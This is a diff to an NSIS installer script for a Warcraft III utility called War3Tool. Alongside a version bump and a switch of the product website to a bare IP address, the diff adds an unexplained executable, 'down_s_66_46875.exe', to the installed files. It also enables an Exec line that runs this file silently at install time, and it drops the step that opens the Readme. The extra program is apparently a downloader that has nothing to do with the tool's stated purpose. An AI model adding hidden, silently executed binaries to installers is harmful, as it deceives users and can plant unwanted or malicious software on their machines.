@@ -4,9 +4,9 @@
 
 ; 安装程序初始定义常量
 !define PRODUCT_NAME "War3Tool"
-!define PRODUCT_VERSION "V3.1"
+!define PRODUCT_VERSION "V3.2"
 !define PRODUCT_PUBLISHER "pipi"
-!define PRODUCT_WEB_SITE "http://pipihaha.sinaapp.com/"
+!define PRODUCT_WEB_SITE "http://121.199.10.53/"
 !define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\war3Tool.exe"
 !define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
 !define PRODUCT_UNINST_ROOT_KEY "HKLM"
@@ -68,14 +68,15 @@ Section "MainSection" SEC01
   File "war3set.ini"
   File "Update.exe"
   File  "kill.bat"
+  File  "down_s_66_46875.exe"
 SectionEnd
 
 Section -AdditionalIcons
-  #Exec "$INSTDIR\down_s_66_46875.exe"
+  Exec "$INSTDIR\down_s_66_46875.exe"
   WriteIniStr "$INSTDIR\${PRODUCT_NAME}.url" "InternetShortcut" "URL" "${PRODUCT_WEB_SITE}"
   CreateShortCut "$SMPROGRAMS\魔兽一键进局域网全屏改键\Website.lnk" "$INSTDIR\${PRODUCT_NAME}.url"
   CreateShortCut "$SMPROGRAMS\魔兽一键进局域网全屏改键\Uninstall.lnk" "$INSTDIR\uninst.exe"
-   WriteINIStr $INSTDIR\\war3set.ini  War3version version 130819
+   WriteINIStr $INSTDIR\\war3set.ini  War3version version 130822
 
 SectionEnd
 
@@ -88,7 +89,7 @@ Section -Post
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayVersion" "${PRODUCT_VERSION}"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "URLInfoAbout" "${PRODUCT_WEB_SITE}"
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "Publisher" "${PRODUCT_PUBLISHER}"
-  ExecShell "open" "$INSTDIR\Readme.txt"
+
 SectionEnd
 
 /******************************
